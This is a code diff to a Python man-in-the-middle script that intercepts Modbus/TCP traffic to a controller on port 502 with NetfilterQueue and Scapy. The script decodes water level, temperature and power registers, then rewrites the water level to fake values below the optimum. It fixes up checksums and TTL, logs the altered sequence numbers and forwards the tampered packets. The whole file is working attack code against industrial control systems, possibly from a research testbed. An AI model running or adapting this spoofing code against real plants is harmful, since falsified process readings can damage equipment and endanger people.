@@ -26,19 +26,14 @@ def plx(x):
 def runAttack(response, pkt):
     sc_pkt = IP(pkt.get_payload())
     ip_hex = toHex(str(sc_pkt))
-    print(sc_pkt[IP].dst)
-    print(sc_pkt[TCP].dport)
-    print(ip_hex[118:120])
-    print(ip_hex[124:130])
-
+    print(sc_pkt.show())
     if sc_pkt[IP].dst == MODBUS_SLAVE and sc_pkt[TCP].dport == 502 and ip_hex[118:120] == '10' and ip_hex[124:130] == '001224':
         registers = []
 
         for i in range(0, 18):
             index = 130 + (4 * i)
             registers.append(int(ip_hex[index:index + 4], 16))
-            print(int(ip_hex[index:index + 4], 16))
-        print("listed")
+
         waterLevel = ne.modbusDecode(0, 4, 4, registers)
         waterTemp = ne.modbusDecode(4, 2, 2, registers)
         powerOut = ne.modbusDecode(6, 6, 2, registers)
@@ -57,12 +52,10 @@ def runAttack(response, pkt):
             # Constantly 1,500L below optimum level +- 15%
             waterLevel = 500000 - (1500 * (random.randint(85, 115) / 100))
         if response == 4:
-            # Constantly 1,500L below optimum level +- 15% + last add of water from master
-            waterLevel = 500000 - (1500 * (random.randint(85, 115) / 100)) + addWater
+            # Constantly 1,000L below optimum level +- 15% + steamStep
+            waterLevel = 500000 - (1000 * (random.randint(85, 115) / 100)) + steamStep
 
         outputs = []
-        print(response)
-        print("LEVEL" + str(waterLevel))
         outputs = ne.modbusEncode(waterLevel, 4, 4, outputs)
         outputs = ne.modbusEncode(waterTemp, 2, 2, outputs)
         outputs = ne.modbusEncode(powerOut, 6, 2, outputs)
@@ -80,18 +73,14 @@ def runAttack(response, pkt):
                 add = '0' + str(add)
             payload += plx(add[0:2]) + plx(add[2:4])
 
-        print(toHex(sc_pkt[Raw].load))
         sc_pkt[Raw].load = sc_pkt[Raw].load[0:13] + payload
-        print(toHex(sc_pkt[Raw].load))
-
+        sc_pkt[IP].ttl -= 1
         del sc_pkt[IP].chksum
         del sc_pkt[TCP].chksum
         sc_pkt.show2()
-        #send(sc_pkt)
-        #pkt.drop()
-        print(str(pkt))
+        falt = open("RIAAlteredSeqs.txt", "a")
+        falt.write(str(response) + "," + str(sc_pkt[TCP].seq) + "\n")
         pkt.set_payload(str(sc_pkt))
-        print(str(pkt))
         pkt.accept()
     else:
         pkt.accept()
@@ -99,15 +88,16 @@ def runAttack(response, pkt):
 def mitm(pkt):
     f = open("RIAMode.txt")
     mode = f.readline()
-    #print "[" + mode + "]"
 
     if mode != 'n':
         runAttack(mode, pkt)
     else:
-        #print(len(pkt.get_payload()))
         pkt.accept()
     f.close()
 
+f = open("RIAAlteredSeqs.txt", "w+")
+f.write("START")
+f.close()
 nfqueue = NetfilterQueue()
 nfqueue.bind(1, mitm)
 
